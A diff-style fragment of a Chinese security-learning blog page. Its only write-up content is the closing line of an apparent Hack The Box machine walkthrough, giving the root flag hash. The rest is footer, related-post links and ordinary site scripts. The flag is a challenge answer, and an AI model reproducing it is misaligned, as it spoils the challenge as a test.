+</div><p>得到 root flag：<code>7e87656d4e1e919725cf733c5355cad7</code>。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/15.-twomillion/">
+        
+        
+            <div class="article-image">
+                <img src="/p/15.-twomillion/assets/image-20261109110807877.d619cdf339ca6a409d090c0a0a10808d_hu2928835098330789906.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 15. TwoMillion"
+                        
+                        data-hash="md5-1hnN8znKakCdCQwKChCAjQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">15. TwoMillion</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/14.-cap/">
+        
+        
+            <div class="article-image">
+                <img src="/p/14.-cap/assets/image-20261108105321725.ca37d98cbd0867071a239ed30859a09c_hu2194329561987376679.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 14. Cap"
+                        
+                        data-hash="md5-yjfZjL0IZwcaI57TCFmgnA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">14. Cap</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/htb-sherlocks-dfir%E7%B3%BB%E5%88%97/">
+        
+        
+            <div class="article-image">
+                <img src="/p/htb-sherlocks-dfir%E7%B3%BB%E5%88%97/assets/image-20261109172652784.9d097f62fa823dd4d18a40bd7f05eaf9_hu209872944237851452.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HTB sherlocks DFIR系列"
+                        
+                        data-hash="md5-nQl/YvqCPdTRikC9fwXq&#43;Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB sherlocks DFIR系列</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+.article-content .highlight-wrap {
+  position: relative;
+  overflow: hidden;
+  border-radius: var(--card-border-radius);
+}
+.article-content .highlight-wrap .highlight {
+  margin:0;
+}
+ 
+.article-content .highlight-wrap.collapse {
+  max-height: 380px;
+}
+ 
+.article-content .highlight-wrap.collapse::after {
+  content: "";
+  position: absolute;
+  left:0;
+  bottom:0;
+  width:100%;
+  height: 80px;
+  background: linear-gradient(transparent, var(--pre-background-color));
+  pointer-events: none;
+}
+ 
+.article-content .code-expand-btn {
+  position:absolute;
+  bottom:8px;
+  right:12px;
+  z-index:2;
+  border: none;
+  padding: 4px 8px;
+  border-radius: 6px;
+  background: var(--card-background);
+  color: var(--text-color);
+  cursor: pointer;
+}
+</style>
+<script>
+document.addEventListener('DOMContentLoaded', ()=>{
+  document.querySelectorAll('.highlight-wrap').forEach(wrap=>{
+    const btn = wrap.querySelector('.code-expand-btn');
+    btn.addEventListener('click', ()=>{
+      wrap.classList.toggle('collapse');
+      btn.innerText = wrap.classList.contains('collapse') ? "▼ 展开" : "▲ 收起";
+    })
+  })
+})
+</script>
+
+    </body>
+</html>
